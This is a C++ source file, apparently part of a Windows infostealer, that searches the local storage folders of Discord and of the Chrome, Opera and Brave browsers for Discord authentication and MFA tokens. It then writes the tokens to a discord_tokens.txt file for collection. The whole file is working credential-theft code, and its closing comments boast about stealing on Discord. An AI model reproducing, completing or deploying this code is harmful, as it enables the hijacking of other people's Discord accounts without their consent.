#include "discord.h"
#include "utils.h"

#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <regex>
#include <vector>
#include <string>
#include <iostream> //for debugging only, you can remove it

//relative paths where Discord and its variants store LevelDB tokens
const std::vector<std::string> discord_paths = {
    R"(Discord\Local Storage\leveldb)",
    R"(discordcanary\Local Storage\leveldb)",
    R"(discordptb\Local Storage\leveldb)",
    R"(Google\Chrome\User Data\Default\Local Storage\leveldb)", // Chrome tokens (optional)
    R"(Opera Software\Opera Stable\Local Storage\leveldb)",
    R"(BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb)"
};

//regular expressions to capture valid Discord tokens
// typical format:
//  - display tokens in the format: [24 characters].[6 characters].[27 characters]
//  - also "mfa" type tokens (multi factor auth)
const std::regex token_regex(R"([A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27})");
const std::regex mfa_token_regex(R"(mfa\.[A-Za-z0-9_\-]{84})");

//helper function to read entire file in string
static std::string read_file_to_string(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return "";

    std::string contents((std::istreambuf_iterator<char>(file)),
                         std::istreambuf_iterator<char>());
    return contents;
}

static std::vector<std::string> extract_tokens(const std::string& data) {
    std::vector<std::string> tokens;

    auto search_start = data.cbegin();
    std::smatch match;

    while (std::regex_search(search_start, data.cend(), match, token_regex)) {
        tokens.push_back(match.str());
        search_start = match.suffix().first;
    }

    //idk, maybe also look for MFA tokens
    search_start = data.cbegin();
    while (std::regex_search(search_start, data.cend(), match, mfa_token_regex)) {
        tokens.push_back(match.str());
        search_start = match.suffix().first;
    }

    return tokens;
}

static std::vector<std::string> unique_tokens(const std::vector<std::string>& tokens) {
    std::vector<std::string> uniqueList;
    for (const auto& t : tokens) {
        if (std::find(uniqueList.begin(), uniqueList.end(), t) == uniqueList.end()) {
            uniqueList.push_back(t);
        }
    }
    return uniqueList;
}

static std::vector<std::string> get_discord_leveldb_paths() {
    std::vector<std::string> full_paths;

    char appdata_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
        std::string appdata(appdata_path);
        for (const auto& rel : discord_paths) {
            full_paths.push_back(appdata + "\\" + rel);
        }
    }

    char localappdata_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localappdata_path))) {
        std::string localappdata(localappdata_path);
        for (const auto& rel : discord_paths) {
            full_paths.push_back(localappdata + "\\" + rel);
        }
    }

    return full_paths;
}

static std::vector<std::string> extract_tokens_from_folder(const std::string& folder) {
    std::vector<std::string> found_tokens;

    if (!std::filesystem::exists(folder)) return found_tokens;

    for (auto& entry : std::filesystem::directory_iterator(folder)) {
        if (!entry.is_regular_file()) continue;

        std::string path = entry.path().string();
        std::string ext = entry.path().extension().string();

        if (ext != ".log" && ext != ".ldb" && ext != ".txt") continue;

        std::string file_data = read_file_to_string(path);
        if (file_data.empty()) continue;

        auto tokens = extract_tokens(file_data);
        for (const auto& t : tokens) {
            found_tokens.push_back(t);
        }
    }

    return unique_tokens(found_tokens);
}

static void save_tokens_to_file(const std::vector<std::string>& tokens, const std::string& outputFolder) {
    if (tokens.empty()) return;

    std::string filepath = outputFolder + "discord_tokens.txt";
    std::ofstream ofs(filepath, std::ios::app);

    for (const auto& token : tokens) {
        ofs << token << "\n";
    }

    ofs.close();
}

void dump_discord_tokens(const std::string& outputFolder) {
    std::vector<std::string> all_tokens;

    auto folders = get_discord_leveldb_paths();

    for (const auto& folder : folders) {
        auto tokens = extract_tokens_from_folder(folder);
        all_tokens.insert(all_tokens.end(), tokens.begin(), tokens.end());
    }

    all_tokens = unique_tokens(all_tokens);

    save_tokens_to_file(all_tokens, outputFolder);
}
//wow this crazy
//damn, I love "stealing" on Discord
//im skid! butt... you also took for steal skids
